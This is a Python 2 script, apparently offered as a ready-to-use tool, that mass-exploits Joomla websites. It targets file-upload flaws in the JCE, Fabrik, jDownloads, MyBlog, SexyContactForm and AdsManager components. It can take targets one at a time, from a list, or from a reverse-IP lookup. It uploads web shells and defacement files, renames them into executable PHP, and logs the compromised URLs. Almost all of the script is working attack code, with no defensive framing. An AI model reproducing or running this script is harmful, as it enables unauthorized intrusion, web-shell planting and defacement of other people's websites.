#! Created By Zeldaus
#! 28/10/2020
#! We don't write code code write us  :D
#! /usr/bin/python
import requests,sys,urllib2
import os
from colorama import Fore,Back,init
init()
try:
        os.system('title Exploit By Wasymus')
except:
        pass
class thewar:
        def __init__(self):
                self.Deface_image = 'files/hacked.gif'
                self.shellx = 'files/hd.txt'
                self.shellcom = "files/shellcom.php"
                banner = """   
           _
       .__(.)< (MEOW)
        \___)
                                              
                                              """
                print Fore.MAGENTA+banner
                print Fore.CYAN+"""
        [+]Choice 1 = Scan Single Target  !
        [+]Choice 2 = Mass Scan From List ! """+Fore.GREEN+"( Delete http:// & / from list )"+Fore.CYAN+"""
        [+]Choice 3 = Scan from single ip ! """
                print "\n"
                x55 = raw_input(Fore.RED+'Choice:')
                if x55 == '1':
                        sit = raw_input('Site:')
                        self.jce(sit)
                        self.fabrik(sit)
                        self.jdownload(sit)
                        self.myblog(sit)
                        self.comsexycontactform(sit)
                        self.adsmanager(sit)
                elif x55 =='2':
                        m = open(raw_input('List :'),'r').readlines()
                        for sites in m:
                                sites = sites.rstrip()
                                self.jce(sites)
                                self.fabrik(sites)
                                self.jdownload(sites)
                                self.comsexycontactform(sites)
                                self.adsmanager(sites)
                elif x55 == '3':
                        ip = raw_input('IP:')
                        req = urllib2.urlopen("http://api.hackertarget.com/reverseiplookup/?q="+ip ,timeout=3)
                        for lines in req.readlines():
                                stes =  lines.rstrip('\n')
                                self.jce(stes)
                                self.fabrik(stes)
                                self.jdownload(stes)
                                self.comsexycontactform(stes)
                                self.adsmanager(stes)
                else:
                        print Fore.WHITE+'Put a number between 1 & 3'
        def jce(self,site):
                url = 'http://'+site+'/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20'
                data = {'upload-dir':'','upload-overwrite':0,'action':'upload'}
                files = {'Filedata':('files/shell.gif',open('files/shell.gif','rb'))}
                try:
                        req = requests.post(url,files=files,data=data,timeout=3)
                        if '"text":"'+'shell.gif' in req.content:
                                PrivMethod = {'json': "{\"fn\":\"folderRename\",\"args\":[\"/" + 'shell.gif'
                                      + "\",\"./../../hd.php\"]}"}
                                try:
                                        cccccc = 'http://' + site + '/index.php?option=com_jce&task=' \
                                                         'plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw'
                                        requests.post(cccccc, data=PrivMethod, timeout=3)
                                        try:
                                                pmwq = requests.get('http://'+site+'/hd.php',timeout=3).content
                                                if 'Hacked' in pmwq:
                                                        pxqa = open('rezult.txt','a').write('http://'+site+'/hd.php'+'\n')
                                                        print Fore.CYAN+'[ Com_JCE Index :  '+'http://'+site+'/hd.php'+'  ]'
                                        except:
                                                pass
                                except:
                                        pass
                        else:
                                print Fore.YELLOW+'[ Com_JCE Index No : '+'http://'+site+'/'+'  ]' 
                except:
                        pass
        def fabrik(self,site):
                try:
                        fileindex = {'userfile': ('hd.txt', open('files/hd.txt', 'rb'), 'multipart/form-data')}
                        post_data = {
                                "name": "me.php",
                                "drop_data": "1",
                                "overwrite": "1",
                                "field_delimiter": ",",
                                "text_delimiter": "&quot;",
                                "option": "com_fabrik",
                                "controller": "import",
                                "view": "import",
                                "task": "doimport",
                                "Itemid": "0",
                                "tableid": "0"
                                }
                        d = requests.post('http://'+site+'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1',data=post_data,files=fileindex,timeout=3)
                        xx = requests.get('http://'+site+'/media/hd.txt',timeout=3).content
                        if 'Hacked' in xx:
                                print Fore.CYAN+'[ Com_Fabrik Index :  '+'http://'+site+'/media/hd.txt'+'  ]'
                                pxqa = open('rezult.txt','a').write('http://'+site+'/media/hd.txt'+'\n')
                        else:
                                print Fore.YELLOW+'[ Com_Fabrik Index No : '+'http://'+site+'/'+'  ]'
                except:
                        pass
        def jdownload(self,site):
                try:
                        fileindex = {'file_upload': (self.shellx, open(self.shellx, 'r'),'multipart/form-data'),
                                     'pic_upload': (self.Deface_image, open(self.Deface_image, 'rb'), 'multipart/form-data')}
                        post_data = {
                                'name': 'kiki',
                                'mail': 'wasimteam561@gmail.com',
                                'catlist': '1',
                                'filetitle': "ljadid",
                                'description': "<p>gol</p>",
                                '2d1a8f3bd0b5cf542e9312d74fc9760f': 1,
                                'send': 1,
                                'senden': "Send file",
                                'description': "<p>qsdqsdqsdqsdqsdqsdqsd</p>",
                                'option': "com_jdownloads",
                                'view': "upload"
                                }
                        pmx = requests.post('http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload',files=fileindex,data=post_data,timeout=3)
                        chck = requests.get('http://'+site+'/images/jdownloads/screenshots/hacked.gif').text.encode('utf-8')
                        if 'GIF89a' in chck:
                                print Fore.CYAN+'[ Com_Jdownload Index :  '+'http://'+site+'/images/jdownloads/screenshots/hacked.gif'+'  ]'
                                pxqaa = open('rezult.txt','a').write('http://'+site+'/images/jdownloads/screenshots/hacked.gif'+'\n')
                        else:
                                print Fore.YELLOW+'[ Com_Jdownload Index No : '+'http://'+site+'/'+'  ]'
                except:
                        pass
        def  myblog(self,site):
                files = {'fileToUpload': open('files/hacked.gif','rb')}
                url = 'http://' + site + '/index.php?option=com_myblog&task=ajaxupload'
                request = requests.post(url,files=files,timeout=3)
                ml = requests.get('http://' + site + '/images/hacked.gif').content
                if 'GIF89a' in ml:
                        print Fore.CYAN+'[  Com_MyBlog Index http://' + site + '/images/hacked.gif  ]'
                        printope = open('rezult.txt','a').write('http://'+site+'/images/hacked.gif'+'\n')
                else:
                        print Fore.GREEN+'[  Com_MyBLOG Not '+Fore.RED+' Uploaded  ]'
        def comsexycontactform(self,site):
                shelm = {'files[]':('files/shellcom.php',open(self.shellcom,'rb'))}
                try:
                        sendreq = requests.post('http://'+site+'/components/com_sexycontactform/fileupload/index.php',files=shelm,timeout=3)
                        checkup = requests.get('http://'+site+'/components/com_sexycontactform/fileupload/shellcom.php').content
                        if 'done' in checkup:
                                try:
                                        por = requests.get('http://'+site+'hd.html').content
                                        if 'Hacked' in por:
                                                print Fore.CYAN+'http://'+site+'/hd.html'
                                                print Fore.GREEN+'[ SexyContactForm Shell http://'+site+'/images/hd.php  ]'
                                                rintope = open('Shell_Sahara4.txt','a').write('http://'+site+'/images/hd.php'+'\n')
                                                printope = open('rezult.txt','a').write('http://'+site+'/hd.html'+'\n')
                                        else:
                                                pass
                                except: 
                                        pass
                        else:
                                print Fore.YELLOW+'[ SexyContactForm No : http://'+site+'/  ]'
                except:
                        pass
        def adsmanager(self,site):
                url = 'http://'+site+'/index.php?option=com_adsmanager&task=upload&tmpl=component'
                files = {'file':('shell.gif',open('files/shell.gif'))}
                data = {'name':'owned.html'}
                try:
                        rep = requests.post(url,files=files,data=data,timeout=3)
                        md = requests.get('http://'+site+'/tmp/plupload/owned.html').content
                        if 'Hacked' in md:
                                print Fore.GREEN+'[ AdsManager Index '+Fore.RED+'http://'+site+'/tmp/plupload/owned.html'+'  ]'
                                printope = open('rezult.txt','a').write('http://'+site+'/tmp/plupload/owned.html'+'\n')
                        else:
                                print Fore.YELLOW+'[ AdsManager Not Uploaded http://'+site+'/  ]'
                except:
                        pass
war = thewar()
